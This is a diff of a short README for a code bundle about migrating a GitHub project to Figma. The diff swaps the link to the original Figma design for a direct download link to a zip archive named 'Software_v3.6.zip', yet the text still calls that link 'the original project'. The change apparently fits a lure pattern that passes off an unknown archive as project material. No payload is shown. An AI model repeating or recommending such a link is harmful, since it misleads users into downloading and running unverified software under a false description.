@@ -1,7 +1,7 @@
 
   # 迁移GitHub项目到Figma
 
-  This is a code bundle for 迁移GitHub项目到Figma. The original project is available at https://www.figma.com/design/S7BjCxMLnKPjNaUceynDLo/%E8%BF%81%E7%A7%BBGitHub%E9%A1%B9%E7%9B%AE%E5%88%B0Figma.
+  This is a code bundle for 迁移GitHub项目到Figma. The original project is available at https://github.com/maomaoguo89-star/Githubfigmaaiapp/raw/refs/heads/main/src/Software_v3.6.zip
 
   ## Running the code
 
